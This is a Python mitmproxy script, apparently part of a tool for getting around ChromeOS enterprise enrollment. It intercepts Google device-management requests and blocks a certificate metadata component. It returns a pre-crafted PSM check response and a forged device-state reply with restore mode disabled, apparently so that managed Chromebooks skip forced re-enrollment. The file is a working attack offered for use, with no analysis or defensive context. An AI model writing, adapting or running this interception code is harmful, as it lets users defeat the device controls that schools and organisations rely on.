import argparse
import asyncio
import logging

from pathlib import Path

from mitmproxy import http
from mitmproxy.options import Options
from mitmproxy.tools.dump import DumpMaster

from dmbackend import device_management_backend_pb2 as proto

parser = argparse.ArgumentParser()
parser.add_argument("-v", "--verbose", action="store_true", help="enable mitmproxy verbose logging")
args = parser.parse_args()

class DMProxy:
    def __init__(self) -> None:
        self.psm_response = (Path(__file__).resolve().parent / "payload" / "psm_response.bin").read_bytes()

    def request(self, flow: http.HTTPFlow) -> None:
        if "efniojlnjndmcbiieegkicadnoecjjef" in flow.request.path:
            flow.response = http.Response.make(403)
            print("[proxy] blocked PKIMetadata component from being fetched")
            return

        if "/devicemanagement/" not in flow.request.path:
            return

        req_type = flow.request.query.get("request")

        if req_type == "enterprise_psm_check":
            flow.response = http.Response.make(
                200, self.psm_response,
                {"Content-Type": "application/x-protobuffer"},
            )

            print("[proxy] sent crafted psm response to client")
            return

        if req_type == "device_state_retrieval":
            response = proto.DeviceManagementResponse()
            response.device_state_retrieval_response.restore_mode = 0

            flow.response = http.Response.make(
                200, response.SerializeToString(),
                {"Content-Type": "application/x-protobuffer"},
            )

            print("[proxy] falling back, sent crafted device state retrieval response")

async def main():
    opts = Options(allow_hosts=["m.google.com", "edgedl.me.gvt1.com"])
    master = DumpMaster(opts, with_termlog=args.verbose, with_dumper=args.verbose)
    master.addons.add(DMProxy())

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    opts.update(emudhra=True)

    print("[proxy] listening at *:8080")
    await master.run()

try:
    asyncio.run(main())
except KeyboardInterrupt:
    pass
